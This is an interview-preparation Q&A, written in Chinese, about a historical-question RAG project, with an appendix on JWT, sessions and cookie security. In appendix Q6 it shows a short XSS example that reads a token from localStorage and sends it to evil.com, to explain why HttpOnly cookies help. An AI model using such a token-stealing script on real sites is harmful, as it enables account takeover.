> 基于 HistoricalFAQ-Bot 项目实战经验整理，覆盖架构设计、PDR、异步优化、异常处理等面试高频考点。

## 一、项目架构概述

### Q1：介绍一下你这个 RAG 项目的整体架构？

**A：**

项目是一个历史问答 RAG 系统，核心链路：

```
用户查询 → Query Rewriting（指代消解）→ 混合检索（向量+BM25+RRF）→ 
PDR 召回 Parent → Prompt 组装（XML 结构化）→ LLM 生成 → 引用溯源
```

**技术栈：**
- 检索：PostgreSQL(pgvector) + BGE-M3(1024维) + BM25 + RRF 融合
- 生成：支持本地/API 双模式 LLM
- API：FastAPI + 异步链路
- 切分：PDR（Parent Document Retrieval）语义切分

**关键设计：**
- LangChain 最小化：检索用原生 SQL + psycopg2，不依赖 LangChain 的 Retriever
- 状态隔离：每个请求独立 ChatEngine 实例，核心组件全局复用
- 异常自闭环：业务层吞掉所有异常，返回带 `error_code` 的结构化响应

## 二、PDR（Parent Document Retrieval）

### Q2：什么是 PDR？为什么要用它？和传统切分有什么区别？

**A：**

**传统方案（扁平切分）：**
```
长文档 → 固定窗口切 chunk(1024字) → 每个 chunk 独立存向量
```
问题：chunk 太小，LLM 看到的上下文不足，回答质量差。

**PDR 方案：**
```
长文档 → 语义边界切 Parent（段落/标题级）→ 每个 Parent 内再切 Child(512token/128overlap)
       → Child 入库做向量检索（细粒度，命中准）
       → 返回关联的 Parent 给 LLM（大粒度，上下文丰富）
```

**核心优势：**
- 检索用小 chunk：语义匹配更精准
- 生成用大 parent：LLM 获得完整上下文，回答更连贯
- 天然去重：多个 child 命中同一 parent 时，只返回一次 parent

### Q3：PDR 在数据库层怎么实现？

**A：**

```sql
CREATE TABLE doc_chunks (
    id SERIAL PRIMARY KEY,
    chunk_text TEXT NOT NULL,        -- child 文本（用于向量检索）
    parent_text TEXT,                -- parent 文本（用于返回给 LLM）
    chunk_vector vector(1024),       -- child 的向量
    doc_name VARCHAR(255),
    chunk_index INTEGER
);
```

**检索逻辑：**
```python
# 用 child 做向量检索
SELECT id, chunk_text, parent_text, ... 
FROM doc_chunks 
ORDER BY chunk_vector <=> query_vector 
LIMIT %s

# 但返回 parent_text 去重
seen_parents = set()
for row in results:
    content = row.parent_text or row.chunk_text
    if content in seen_parents:
        continue
    seen_parents.add(content)
    yield DocResult(content=content, ...)
```

### Q4：PDR 解决了什么问题，又引入了什么新问题？

**A：**

**解决的问题：**
- 检索精度 vs 生成质量的矛盾（小 chunk 检索准，大 context 生成好）

**引入的问题及解决：**

| 问题 | 解决方案 |
|------|---------|
| Prompt 过长 | 控制 `max_doc_in_prompt=5`，数量限制而非内容截断 |
| Parent 重复 | Python 层用 `seen_parents` set 去重 |
| 切分策略复杂 | Parent 用语义边界（段落/标题），Child 用 TokenTextSplitter |

**踩过的坑：**
- 最初 `response_generator.py` 用 `TokenTextSplitter(200)` 截断每个 doc，PDR 意义被完全抵消
- 修复：移除 per-item 截断，完整 parent_text 进 prompt

## 三、混合检索与 RRF

### Q5：你们的检索是怎么做的？用了哪些策略？

**A：**

**三层检索架构：**

1. **FAQ 检索**：向量相似度，`question_vector <=> query_vector`，top_k=3
2. **文档向量检索**：pgvector，`chunk_vector <=> query_vector`，top_k=10
3. **BM25 检索**：`rank-bm25` Python 库，在 `chunk_text` 上做全文检索

**融合策略：RRF（Reciprocal Rank Fusion）**

```python
# RRF 公式：score = Σ(1 / (k + rank))
rrf_k = 60

for doc_id in all_doc_ids:
    vector_rank = get_vector_rank(doc_id)   # 向量检索中的排名
    bm25_rank = get_bm25_rank(doc_id)       # BM25 检索中的排名
    score = 1/(rrf_k + vector_rank) + 1/(rrf_k + bm25_rank)
```

**为什么用 RRF：**
- 向量检索：擅长语义匹配（"李世民"→"唐太宗"）
- BM25：擅长精确匹配（关键词命中）
- RRF 不需要调权重，对排名做融合，更鲁棒

### Q6：检索层怎么做的异步优化？

**A：**

```python
async def asearch(self, query: str) -> SearchContext:
    # FAQ 和 Doc 检索并行执行
    faq_task = asyncio.create_task(
        asyncio.to_thread(self._retrieve_faq, query)
    )
    doc_task = asyncio.create_task(
        asyncio.to_thread(self._retrieve_doc, query)
    )
    faq_results, doc_results = await asyncio.gather(
        faq_task, doc_task, return_exceptions=True
    )
    # ...
```

**关键点：**
- `asyncio.to_thread` 把同步 DB 操作（psycopg2）丢到线程池
- `asyncio.gather` 让 FAQ 和 Doc 检索并行
- 实例级 `ThreadPoolExecutor(max_workers=4)` 避免每次创建线程池

## 四、Prompt 工程与生成

### Q7：你们的 Prompt 是怎么设计的？怎么防止注入？

**A：**

**XML 结构化 Prompt：**

```xml
你是一位专业的中国历史研究专家。
请严格基于以下<参考资料>回答，不要编造。
在相关陈述后标注引用来源（格式如 [1]、[2]）。
如果资料不足以回答，请明确说明。

<参考资料>
  <doc id="1" type="faq">
    <question>...</question>
    <answer>...</answer>
  </doc>
  <doc id="2" type="document" source="xxx" page="1">
    <content>...</content>
  </doc>
</参考资料>

<用户问题>用户原始问题</用户问题>

请回答：
```

**防注入措施：**
- 所有动态内容过 `html.escape()`，防止 XML 标签被破坏
- 不再使用 f-string 直接拼接用户输入

### Q8：怎么控制 Prompt 长度？

**A：**

**策略：数量限制，而非内容截断。**

```python
max_faq_in_prompt = 3
max_doc_in_prompt = 5
```

- 不截断检索到的 parent_text（完整内容进 prompt）
- 通过限制条数控制总长度
- 如果未来 prompt 超长，在检索层解决（减少 top_k、rerank），不在生成层截断

**踩坑：** 早期用 `TokenTextSplitter(200)` 每个 doc 截断到 200 token，PDR 意义完全丧失。

## 五、数据库设计

### Q9：你们的表是怎么设计的？为什么这样设计？

**A：**

**三张核心表：**

```sql
-- 文档切片表（PDR）
doc_chunks (
    id SERIAL PRIMARY KEY,
    chunk_text TEXT NOT NULL,        -- child 文本
    parent_text TEXT,                -- parent 文本（PDR核心）
    chunk_vector vector(1024),       -- 向量
    doc_name VARCHAR(255),
    chunk_index INTEGER
);

-- FAQ 表（人工 curated QA）
faq_knowledge (
    id SERIAL PRIMARY KEY,
    question TEXT NOT NULL,
    question_vector vector(1024),
    answer TEXT NOT NULL,
    category VARCHAR(50),
    source_doc VARCHAR(255)          -- 调试用，非必要
);

-- 对话历史表（游客模式）
chat_history (
    id SERIAL PRIMARY KEY,
    session_id VARCHAR(100),         -- 会话标识
    role VARCHAR(20),                -- human/ai
    content TEXT,
    created_at TIMESTAMP
);
```

**设计原则：**
- FAQ 是独立的知识库，不是文档提取的（人工 curated）
- 去掉冗余字段：`search_vector`、`confidence`、`similar_question`、`source_page`
- `confidence` 是查询时计算的，不存储

## 六、API 架构与 Session 管理

### Q10：FastAPI 层怎么设计的？怎么做到用户隔离？

**A：**

**架构：全局复用核心组件，按请求创建 ChatEngine。**

```python
# 全局单例（无状态，线程安全）
_search_router = ChatEngine._default_search_router()
_response_gen = ResponseGenerator()

def _get_chat_engine(session_id=None):
    # 每次请求 new 一个 ChatEngine（隔离 session）
    # 但注入全局复用的核心组件（避免 BM25 重复加载）
    return ChatEngine(
        session_id=session_id,
        search_router=_search_router,
        response_gen=_response_gen,
    )

@app.post("/api/query")
async def query_faq(request: QueryRequest):
    engine = _get_chat_engine(session_id=request.session_id)
    result = await engine.achat(query=request.question)
    return result  # 包含 session_id，前端保存到 localStorage
```

**为什么这样设计：**
- 全局单例 ChatEngine → `session_id` 串台，所有用户共享历史
- 每次 new ChatEngine + 全局组件 → 既隔离又高效

**Session 流转：**
```
第一次请求：前端不传 session_id → 后端生成 uuid → 返回给前端保存
后续请求：前端传 session_id → 后端加载该 session 的历史
新对话：前端清空 session_id → 后端生成新的 uuid
```

**游客模式：** 不做登录，session_id 存在前端 localStorage，换设备/清缓存 = 历史丢失。

## 七、异常处理与降级策略

### Q11：你们系统的异常处理是怎么设计的？

**A：**

**三层异常体系：**

```python
class DatabaseError(Exception):    # 数据库层：连接失败、SQL错误
class RetrievalError(Exception):   # 检索层：向量检索失败、BM25报错
class GenerationError(Exception):  # 生成层：LLM调用失败、超时
```

**分层处理策略：**

| 层级 | 职责 | 处理方式 |
|------|------|---------|
| 数据访问层 | 包装异常 | `psycopg2.Error` → `DatabaseError` |
| 业务逻辑层 | 分类降级 | DatabaseError → 错误文案；RetrievalError → 纯 LLM 兜底；GenerationError → FAQ 兜底 |
| API 层 | 格式化响应 | 理论上收不到异常（业务层已吞），兜底返回 500 |

**降级链：**
```
正常流程：检索 → LLM 生成
    ↓
检索失败 → 纯 LLM 生成（不带检索上下文）
    ↓
LLM 失败 → 直接返回答案（如果命中 FAQ）
    ↓
全部失败 → "抱歉，服务暂时不可用"
```

**关键设计：** `chat()` / `achat()` 绝不外抛异常，永远返回带 `error_code` 的结构化字典。

### Q12：`raise ... from ...` 是什么意思？什么时候用？

**A：**

```python
try:
    psycopg2.connect(...)
except psycopg2.Error as e:
    raise DatabaseError(f"加载历史失败: {e}") from e
```

**作用：** 保留原始异常链，方便排查。

- 不带 `from`：`During handling of the above exception, another exception occurred`
- 带 `from`：`The above exception was the direct cause of the following exception`

**面试考点：** `raise` 和 `return` 都会终止函数，但 `raise` 是非正常终止，异常向上传播直到被 `except` 捕获。

## 九、面试高频问题速查

### Q：为什么不做登录？
**A：** 当前是游客模式，session_id 存前端 localStorage。登录属于后端基础设施，和 RAG 核心能力无关，优先做 PDR、异步优化、检索策略。

### Q：向量检索和 BM25 的区别？
**A：** 向量检索基于语义相似度（BGE-M3 编码），擅长同义词、近义表达；BM25 基于词频统计，擅长精确关键词匹配。两者互补，RRF 融合。

### Q：怎么保证检索结果的可信度？
**A：** FAQ 有 `1 - (question_vector <=> query_vector)` 作为相似度；Doc 有向量相似度 + BM25 分数 + RRF 融合分数；Prompt 里要求 LLM "如果资料不足以回答，请明确说明"。

### Q：对话历史怎么用的？
**A：** 加载最近 N 条历史 → Query Rewriting（消除指代歧义）→ 检索和生成时注入历史上下文。历史存 PostgreSQL，按 `session_id` 隔离。

## 附录：后端认证与状态管理（面试补充）

> 以下内容为后端岗位面试补充，涵盖 JWT、Session、Cookie、Token 策略等高频考点。

---

### Q1：JWT 是什么？和 Session 有什么区别？

**A：**

**JWT（JSON Web Token）** 是一个自包含的认证凭证，格式为 `Header.Payload.Signature`。

| 维度 | Session | JWT |
|------|---------|-----|
| **状态** | 有状态（服务端存 session 数据） | 无状态（服务端只存 secret_key） |
| **存储位置** | 服务端（Redis/内存） | 客户端（Payload 自带用户信息） |
| **传输方式** | Cookie 带 session_id | Header: `Authorization: Bearer <token>` |
| **跨服务** | ❌ 需要共享 Redis | ✅ 自带用户信息，任意服务验签即可 |
| **体积** | session_id 很小（32字节） | JWT 较大（通常 500-2000 字节） |
| **撤销** | ✅ 服务端删 session 即时生效 | ❌ 只能等过期（需黑名单 Redis 辅助） |

**核心区别：**
- Session = "服务端存用户信息，前端只持有一把钥匙"
- JWT = "用户信息放在 token 里，服务端只负责验真假"

---

### Q2：JWT 的 Header、Payload、Signature 分别是什么？

**A：**

```
eyJhbGciOiJIUzI1NiJ9.         ← Header: Base64 编码的 JSON，声明算法
eyJ1c2VyX2lkIjoidXNlci0xMjMifQ.  ← Payload: Base64 编码的 JSON，承载数据
SflKxwRJSMeKKF2QT4fwpMe...       ← Signature: HMAC-SHA256 签名结果
```

| 部分 | 内容 | 是否可逆 |
|------|------|---------|
| Header | `{"alg": "HS256", "typ": "JWT"}` | ✅ Base64 解码即可 |
| Payload | `{"user_id": "123", "exp": 1714500000}` | ✅ Base64 解码即可 |
| Signature | HMAC(header + "." + payload, secret_key) | ❌ 哈希不可逆，只能验签 |

**重要：Payload 是明文，不能放密码等敏感信息。**

---

### Q3：Signature 是加密吗？

**A：** 不是加密，是**消息认证码（HMAC）**。

| 概念 | 作用 | 可逆？ |
|------|------|--------|
| 加密 | 隐藏内容 | ✅ 可解密 |
| 哈希 | 生成指纹 | ❌ 不可逆 |
| HMAC | **带密钥的哈希** | ❌ 不可逆 |

**为什么用 HMAC 而不是简单哈希？**

```
简单 SHA256：任何人都能算 → 攻击者篡改 payload 后自己算个新签名 → 伪造成功
HMAC-SHA256：需要 secret_key → 攻击者不知道密钥 → 算不出合法签名
```

**验签过程：**
```
服务端用 secret_key + Header.Payload 重新算 HMAC
→ 对比 token 里的 Signature
→ 一致 = 没被篡改
```

---

### Q4：Base64 是压缩吗？

**A：** 不是压缩，是**编码**。

| | 编码 | 压缩 |
|--|------|------|
| 目的 | 换格式 | 减小体积 |
| 体积变化 | 变大（+33%） | 变小 |
| 可逆 | ✅ | ✅ |

**Base64 的作用：** 把二进制数据转成纯文本字符串，方便在文本协议（HTTP/JSON/URL）中传输。

**JWT 为什么用 Base64：**
- Header/Payload 是 JSON，需要放在 URL/Header 中
- Base64 只含 `A-Z a-z 0-9 + / =`，不会破坏 URL/Header 结构
- 注意：Base64 编码**不是加密**，任何人都能解码看内容

---

### Q5：`Bearer` 是什么意思？

**A：** `Bearer` 是 HTTP 协议规定的**认证方式前缀**，表示"持有这张票据的人即被授权"。

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

HTTP 支持多种认证方式：
```http
Authorization: Basic YWxpY2U6MTIzNDU2        ← Basic 认证（用户名:密码）
Authorization: Bearer eyJhbG...              ← Bearer 认证（Token）
Authorization: Digest username="alice"...    ← Digest 认证
```

服务端解析：
```python
scheme, token = auth_header.split(" ", 1)
# scheme = "Bearer"
# token = "eyJhbG..."
```

---

### Q6：Token 存 localStorage 还是 Cookie？

**A：** 两者都可以，安全模型不同。

| 存储方式 | 优点 | 缺点 |
|---------|------|------|
| `localStorage` | 简单、跨域灵活、容量大（5MB） | XSS 攻击可窃取 |
| `HttpOnly Cookie` | 防 XSS（JS 读不到）、浏览器自动发送 | CSRF 风险、跨域麻烦、容量小（4KB） |

**面试考点：XSS 场景**

```javascript
// XSS 攻击脚本
const token = localStorage.getItem('token');     // ✅ 能读到！
fetch('https://evil.com/steal?token=' + token);  // ← 被盗

// HttpOnly Cookie 场景
document.cookie;  // ❌ 读不到 HttpOnly 的 cookie
```

### Q7：什么是双 Token 策略？为什么需要？

**A：**

```
┌─────────────────┐    ┌──────────────────┐
│  Access Token   │    │  Refresh Token   │
│  （访问令牌）    │    │  （刷新令牌）     │
├─────────────────┤    ├──────────────────┤
│  有效期：15分钟  │    │  有效期：7天      │
│  存储：内存/LS  │    │  存储：HttpOnly   │
│  用途：日常请求  │    │  用途：换新的 AT  │
└─────────────────┘    └──────────────────┘
```

**为什么需要两个 Token？**

| 场景 | 单 Token（7天 JWT） | 双 Token |
|------|-------------------|---------|
| XSS 被盗 | 小偷能用 7 天 | 最多用 15 分钟（Access Token 短效） |
| 每次请求验证 | 验签 + 查 Redis | 只验签（快） |
| 撤销权限 | 加黑名单 | Access Token 等过期，Refresh Token 加黑名单 |

**完整流程：**
```
登录 → 发 Access Token（15分钟）+ Refresh Token（HttpOnly Cookie，7天）
  ↓
日常请求：带 Access Token → 服务端只验签（不查库）
  ↓
Access Token 过期（15分钟后）→ 前端自动请求 /refresh
  → 浏览器自动带 HttpOnly Cookie → 服务端验证后发新的 Access Token
  → 用户无感知
  ↓
Refresh Token 过期（7天后）→ 跳转登录页
```

**退出登录：**
```python
# 把 Refresh Token 的 jti 加入 Redis 黑名单
redis.setex(f"blacklist:{jti}", 7*24*3600, "revoked")
# Access Token 还有最多 15 分钟有效期，之后无法续期
```

### Q8：`raise ... from ...` 和 `raise` 有什么区别？

**A：**

```python
try:
    raise ValueError("原始错误")
except ValueError as e:
    # 写法 1：不带 from（异常链断裂）
    raise DatabaseError("包装错误")
    # Traceback 显示：During handling of the above exception, another exception occurred
    
    # 写法 2：带 from（保留异常链）
    raise DatabaseError("包装错误") from e
    # Traceback 显示：The above exception was the direct cause of the following exception
```

**作用：** `from e` 设置新异常的 `__cause__` 属性，保留原始异常信息，方便排查时知道"这个异常是由哪个原始异常导致的"。

### Q9：异常处理中 `raise`、`return`、`logger`、`pass` 怎么选？

**A：**

| 写法 | 作用 | 调用方感知 |
|------|------|-----------|
| `raise` | 终止函数，异常向上抛 | 必须 `except` 处理 |
| `logger` | 记录日志，继续执行 | 完全不知 |
| `return` | 提前返回指定值 | 收到返回值 |
| `pass` | 完全静默 | 完全不知（⚠️ 尽量少用） |

**分层原则：**
- 底层（数据访问层）：包装异常，`psycopg2.Error` → `DatabaseError`，向上抛
- 中层（业务层）：分类降级，`DatabaseError` → 错误文案，`RetrievalError` → 纯 LLM 兜底
- 顶层（API 层）：格式化响应，统一返回结构

### Q10：Cookie 的 `HttpOnly`、`Secure`、`SameSite` 分别是什么？

**A：**

| 属性 | 作用 | 解决什么风险 |
|------|------|-------------|
| `HttpOnly` | JS 无法读取 Cookie | XSS 攻击窃取 Token |
| `Secure` | 只在 HTTPS 传输 | 中间人窃听 |
| `SameSite=Strict` | 第三方网站请求不带 Cookie | CSRF 攻击 |
| `SameSite=Lax` | GET 请求带，POST 不带 | 平衡安全与体验 |

```python
response.set_cookie(
    key="refresh_token",
    value="eyJhbG...",
    httponly=True,      # JS 读不到
    secure=True,        # 只走 HTTPS
    samesite="strict"   # 防 CSRF
)
```
